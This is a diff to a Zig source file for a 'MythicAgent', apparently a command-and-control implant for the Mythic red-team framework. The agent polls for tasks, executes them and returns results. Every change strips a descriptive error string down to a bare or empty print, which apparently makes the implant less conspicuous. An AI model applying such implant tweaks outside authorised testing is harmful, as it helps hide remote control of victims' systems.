@@ -86,13 +86,13 @@ pub const MythicAgent = struct {
             }
             
             self.getTasks() catch |err| {
-                print("[!] Failed to get tasks: {}\n", .{err});
+                print("{}", .{err});
             };
             
             try self.processTasks();
             
             self.sendResponses() catch |err| {
-                print("[!] Failed to send responses: {}\n", .{err});
+                print("{}", .{err});
             };
             
             self.sleep();
@@ -150,13 +150,13 @@ pub const MythicAgent = struct {
 
 
         const decoded_len = base64.standard.Decoder.calcSizeForSlice(response) catch {
-            print("[ERROR] Invalid Base64 response\n", .{});
+            print("", .{});
             return error.InvalidBase64;
         };
         const decoded_response = try self.allocator.alloc(u8, decoded_len);
         defer self.allocator.free(decoded_response);
         base64.standard.Decoder.decode(decoded_response, response) catch {
-            print("[ERROR] Failed to decode Base64 response\n", .{});
+            print("", .{});
             return error.InvalidBase64;
         };
 
@@ -165,7 +165,7 @@ pub const MythicAgent = struct {
         }
         const json_response = decoded_response[36..];
         const parsed = json.parseFromSlice(json.Value, self.allocator, json_response, .{}) catch |err| {
-            print("[ERROR] Failed to parse checkin JSON: {}\n", .{err});
+            print("{}", .{err});
             return err;
         };
         defer parsed.deinit();
@@ -206,14 +206,14 @@ pub const MythicAgent = struct {
         
 
         const decoded_len = base64.standard.Decoder.calcSizeForSlice(response) catch {
-            print("[ERROR] Invalid Base64 response\n", .{});
+            print("", .{});
             return error.InvalidBase64;
         };
         const decoded_response = try self.allocator.alloc(u8, decoded_len);
         defer self.allocator.free(decoded_response);
 
         base64.standard.Decoder.decode(decoded_response, response) catch {
-            print("[ERROR] Failed to decode Base64 response\n", .{});
+            print("", .{});
             return error.InvalidBase64;
         };
         
@@ -229,7 +229,7 @@ pub const MythicAgent = struct {
         const json_response = decoded_response[36..];
         
         const parsed = json.parseFromSlice(struct { action: []const u8, tasks: []Task }, self.allocator, json_response, .{}) catch |err| {
-            print("[ERROR] Failed to parse tasking JSON: {}\n", .{err});
+            print("{}", .{err});
             return err;
         };
         defer parsed.deinit();
@@ -280,7 +280,7 @@ pub const MythicAgent = struct {
                 const result = self.command_executor.executeTask(task.*) catch |err| {
                     const error_response = MythicResponse{
                         .task_id = task.id,
-                        .user_output = try std.fmt.allocPrint(self.allocator, "Error executing task: {}", .{err}),
+                        .user_output = try std.fmt.allocPrint(self.allocator, "{}", .{err}),
                         .completed = true,
                         .status = "error",
                     };
